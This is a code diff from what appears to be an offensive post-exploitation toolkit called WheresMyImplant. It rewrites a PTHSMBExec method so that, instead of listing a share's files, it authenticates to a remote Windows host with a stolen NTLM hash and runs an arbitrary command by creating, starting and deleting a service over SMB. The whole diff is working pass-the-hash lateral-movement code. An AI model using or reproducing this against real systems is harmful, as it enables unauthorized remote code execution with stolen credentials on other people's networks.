@@ -241,42 +241,56 @@ namespace WheresMyImplant
         }
 
         [ManagementTask]
-        public static String PTHSMBExec(String target, String share, String domain, String username, String hash)
+        public static String PTHSMBExec(String target, String command, String domain, String username, String hash)
         {
             StringBuilder output = new StringBuilder();
-            using (SMBClient smbClient = new SMBClient())
+            try
             {
-                smbClient.Connect(target);
-                smbClient.NegotiateSMB();
-                smbClient.NegotiateSMB2();
-                smbClient.NTLMSSPNegotiate();
-                if (smbClient.Authenticate(domain, username, hash))
+                using (SMBExec smbExec = new SMBExec())
                 {
-                    try
+                    smbExec.Connect(target);
+                    smbExec.NegotiateSMB();
+                    smbExec.NegotiateSMB2();
+                    smbExec.NTLMSSPNegotiate();
+                    if (smbExec.Authenticate(domain, username, hash))
                     {
-                        smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
-                        smbClient.IoctlRequest(String.Format(@"\{0}\{1}", target, share));
-                        smbClient.TreeConnect(String.Format(@"\\{0}\{1}", target, share));
-                        smbClient.CreateRequest();
-                        smbClient.InfoRequest();
-                        smbClient.FindRequest();
-                        smbClient.ParseDirectoryContents();
-                        smbClient.CloseRequest();
-                        smbClient.DisconnectTree();
+                        try
+                        {
+                            smbExec.TreeConnect(String.Format(@"\\{0}\{1}", target, "IPC$"));
+                            smbExec.CreateRequest(new Byte[] { 0x01, 0x00, 0x00, 0x00});
+                            smbExec.RPCBind();
+                            smbExec.ReadRequest();
+                            smbExec.OpenSCManagerW();
+                            smbExec.ReadRequest();
+                            smbExec.CheckAccess(command);
+                            smbExec.ReadRequest();
+                            smbExec.StartServiceW();
+                            smbExec.ReadRequest();
+                            smbExec.DeleteServiceW();
+                            smbExec.ReadRequest();
+                            smbExec.CloseServiceHandle();
+                            smbExec.CloseRequest();
+                            smbExec.DisconnectTree();
+                            smbExec.Logoff();
+                        }
+                        catch (Exception ex)
+                        {
+                            output.Append(ex.ToString());
+                        }
+                        finally
+                        {
+                            output.Append(smbExec.GetOutput());
+                        }
                     }
-                    catch (Exception ex)
+                    else
                     {
-                        output.Append(ex.ToString());
-                    }
-                    finally
-                    {
-                        output.Append(smbClient.GetOutput());
+                        output.Append("[-] Login Failed");
                     }
                 }
-                else
-                {
-                    output.Append("[-] Login Failed");
-                }
+            }
+            catch (Exception ex)
+            {
+                output.Append(ex.ToString());
             }
             return output.ToString();
         }
